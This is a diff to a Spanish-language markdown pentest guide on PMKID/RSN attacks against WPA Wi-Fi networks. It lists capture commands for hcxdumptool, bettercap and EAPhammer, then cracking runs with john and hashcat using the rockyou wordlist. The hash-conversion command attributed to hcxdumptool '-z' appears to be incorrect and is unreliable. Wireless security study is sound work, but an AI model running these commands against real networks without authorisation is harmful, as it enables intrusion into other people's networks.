@@ -2419,7 +2419,19 @@ En un ataque `PMKID/RSN`, el atacante busca obtener la `PMK` de la `WLAN` **sin 
 
 ### 🥷🕵️ Métodos para obtener `PMKID`
 
-1. **`betterrcap`**: 
+1. **`hcxdumptool`**
+
+````sh
+# 1. Realizar una captura desde hcxdumptool
+# -i = interface
+# -o = output
+# --enable_status=1 
+
+# Comando:
+hcxdumptool -i wlan0mon -o Fz3r0_RSN_PMKID --enable_status=1
+````
+
+2. **`betterrcap`**: 
 
 ````sh
 # **** Tener el adaptador en monitor
@@ -2436,43 +2448,54 @@ wifi.assoc all
     # En este punto el .pac ya tendrá lso hashed del RSN PMKID
 ````
 
-2. **`hcxdumptool`**
+3. **`EAPhammer`**
 
 ````sh
-# 1. Realizar una captura desde hcxdumptool
-# -i = interface
-# -o = output
-# --enable_status=1 
-hcxdumptool -1 wlan0mon -o Fz3r0_RSN_PMKID --enable_status=1
+# Comando:
+./eaphammer --pmkid --interface wlan0mon --channel 6 --bssid 70:4C:A5:F8:9A:C1
 ````
 
 ---
 
 ### 🗡️🎩 Cracking: `PMKID`
 
-2. Crackear los hashes con `hcxdumptool`
+1. Antes de poder crackear el PMKID **es necesario convertirlo a un hash que pueda leer `john` o `hashcat`, esto se hace con `hcxdumptool`**
 
 ````sh
 # 1. Primero mostrar los hashes de la captura y guardarlos en un archivo
 # -z Nombre de archivo de hashes
 hcxdumptool -z Fz3r0_Hashes Fz3r0_RSN_PMKID
 
-# 2. Una vez guardados se pueden ver con un simple cat y poderlos empezar a crackear
+# - Una vez guardados se pueden ver con un simple cat y poderlos empezar a crackear
 cat Fz3r0_Hashes
+````
+2. Cracking `PMKID hashes`: `john`
 
-# 3. Opción con john: Guárdame este fierrito, Crack it!
+````sh
+# 1. Guárdame este fierrito, Crack it!
 john --wordlist=/usr/share/wordlists/rockyou.txt Fz3r0_Hashes
 
 # - Revisar la DB de john
 john --show Fz3r0_Hashes
+````
 
-# 3. Opción con Hashcat: Guárdame este fierrito, Crack it!
+2. Cracking `PMKID hashes`: `hashcat`
+
+````sh
+# Revisar el código de los ejemplos:
 hashcat --example-hashes | grep "16800" -C 2
 
+# Opción 1: Miau miau!!!, Crack it!
 hashcat -m 16800 -a 0 Fz3r0_Hashes /usr/share/wordlists/rockyou.txt
 
+# Opción 2: Miau miau!!!, Crack it!
+hashcat -m 16800 --force Fz3r0_Hashes /usr/share/wordlists/rockyou.txt
+
+# - Revisar la DB de hashcat
 hashcat -m 16800 --show Fz3r0_Hashes
 ````
+
+
 
 
 
